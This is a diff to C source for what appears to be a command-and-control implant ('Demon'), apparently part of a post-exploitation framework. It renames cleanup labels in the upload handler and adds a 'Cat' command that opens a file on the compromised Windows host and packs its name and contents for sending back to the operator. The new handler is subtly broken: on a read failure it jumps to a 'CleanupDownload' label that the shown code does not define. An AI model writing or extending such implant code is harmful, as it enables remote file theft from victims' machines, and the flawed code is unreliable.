@@ -68,9 +68,6 @@ VOID CommandDispatcher( VOID )
         PackageAddInt32( Package, Instance->Session.DemonID );
         PackageTransmit( Package, &DataBuffer, &DataBufferSize );
 
-#ifdef TRANSPORT_SMB
-        PRINT_HEX( DataBuffer, DataBufferSize )
-#endif
         if ( DataBuffer && DataBufferSize > 0 )
         {
             ParserNew( &Parser, DataBuffer, DataBufferSize );
@@ -821,20 +818,20 @@ VOID CommandFS( PPARSER DataArgs )
             {
                 PUTS( "CreateFileA: Failed" )
                 SEND_WIN32_BACK
-                goto Cleanup;
+                goto CleanupUpload;
             }
 
             if ( ! Instance->Win32.WriteFile( hFile, Content, FileSize, &Written, NULL ) )
             {
                 PUTS( "WriteFile: Failed" )
                 SEND_WIN32_BACK
-                goto Cleanup;
+                goto CleanupUpload;
             }
 
             PackageAddInt32( Package, FileSize );
             PackageAddBytes( Package, FileName, NameSize );
 
-        Cleanup:
+        CleanupUpload:
             Instance->Win32.NtClose( hFile );
             hFile = NULL;
 
@@ -927,6 +924,58 @@ VOID CommandFS( PPARSER DataArgs )
             else
                 PackageAddBytes( Package, Path, Return );
 
+            break;
+        }
+
+        case 10:
+        {
+            PUTS( "FS::Cat" )
+
+            DWORD  FileSize = 0;
+            DWORD  Read     = 0;
+            DWORD  NameSize = 0;
+            PCHAR  FileName = ParserGetBytes( DataArgs, &NameSize );
+            HANDLE hFile    = NULL;
+            PVOID  Content  = NULL;
+
+            FileName[ NameSize ] = 0;
+
+            PRINTF( "FileName => %s", FileName )
+
+            hFile = Instance->Win32.CreateFileA( FileName, GENERIC_READ, 0, 0, OPEN_ALWAYS, 0, 0 );
+            if ( ( ! hFile ) || ( hFile == INVALID_HANDLE_VALUE ) )
+            {
+                PUTS( "CreateFileA: Failed" )
+                SEND_WIN32_BACK
+                goto CleanupCat;
+            }
+
+            FileSize = Instance->Win32.GetFileSize( hFile, 0 );
+            Content  = Instance->Win32.LocalAlloc( LPTR, FileSize );
+
+            if ( ! Instance->Win32.ReadFile( hFile, Content, FileSize, &Read, NULL ) )
+            {
+                PUTS( "ReadFile: Failed" )
+                SEND_WIN32_BACK
+                goto CleanupDownload;
+            }
+
+            PackageAddBytes( Package, FileName, NameSize );
+            PackageAddBytes( Package, Content,  FileSize );
+
+        CleanupCat:
+            if ( hFile )
+            {
+                Instance->Win32.NtClose( hFile );
+                hFile = NULL;
+            }
+
+            if ( Content )
+            {
+                MemSet( Content, 0, FileSize );
+                Instance->Win32.LocalFree( Content );
+                Content = NULL;
+            }
             break;
         }
 
